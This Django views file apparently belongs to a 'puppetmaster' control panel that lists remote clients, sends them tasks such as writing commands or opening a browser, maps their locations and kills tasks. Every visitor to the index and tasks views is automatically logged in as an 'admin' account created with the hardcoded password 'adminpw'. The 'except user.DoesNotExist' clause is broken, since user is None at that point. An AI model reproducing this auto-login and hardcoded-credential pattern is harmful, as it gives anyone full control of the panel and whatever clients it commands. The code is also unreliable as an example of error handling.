from django.shortcuts import render
from django.http import HttpResponseRedirect, JsonResponse
from .forms import clientForm
from .models import Client, SentTask, Notification
from .filters import ClientFilter, TaskFilter
from .server import ControlServerHandler
import json
from notifications.signals import notify
from django.contrib.auth.models import User
from django.contrib.auth import login


def kill_task(request):
    # TODO: Send to control server
    return


def index(request):
    controlServer = ControlServerHandler()
    controlServer.getClients()
    user = None
    try:
        user = User.objects.get(username='admin')
    except user.DoesNotExist:
        user = User.objects.create_user(username='admin', 
                                        email='admin@puppetmaster.com', 
                                        password='adminpw')
    
    login(request, user)

    # notify.send(user, recipient=user, verb='you reached level 10')

    tasks = [{'name': "Write command"}, {'name': "Open browser"}]

    if request.method == 'POST':
        form = clientForm(request.POST)
        if form.is_valid():
            controlServer.sendTasks(request)
            return HttpResponseRedirect(request.path_info)
    else:
        form = clientForm()

    statistics = controlServer.getStatistics()
    locations = controlServer.getLocations()
    locations = {'locations': locations}

    context = {'clients': Client.objects.all(),
               'tasks': tasks,
               'form': form,
               'statistics': statistics,
               'locations': json.dumps(locations),
               'filter': ClientFilter(request.GET, queryset=Client.objects.all())}

    return render(request, 'website/index.html', context, )


def tasks(request):
    controlServer = ControlServerHandler()
    controlServer.getTasks()

    user = None
    try:
        user = User.objects.get(username='admin')
    except user.DoesNotExist:
        user = User.objects.create_user(username='admin', 
                                        email='admin@puppetmaster.com', 
                                        password='adminpw')
    
    login(request, user)

    if request.method == 'POST':
        controlServer.killTask(request)
        return HttpResponseRedirect(request.path_info)

    context = {'tasks': TaskFilter(request.GET, queryset=SentTask.objects.all().order_by('-id')),
               'notifications': Notification.objects.all() }
    return render(request, 'website/tasks.html', context)


def updated_tasks(request):
    controlServer = ControlServerHandler()
    updatedTaskStatus = controlServer.getUpdatedTaskStatus()
    updatedTaskList = {
        'tasks': updatedTaskStatus
    }

    return JsonResponse(updatedTaskList)

def updated_client_status(request):
    controlServer = ControlServerHandler()
    updatedclientStatus = controlServer.getUpdatedClientStatus()
    updatedClientList = {
        'clients': updatedclientStatus
    }

    return JsonResponse(updatedClientList)

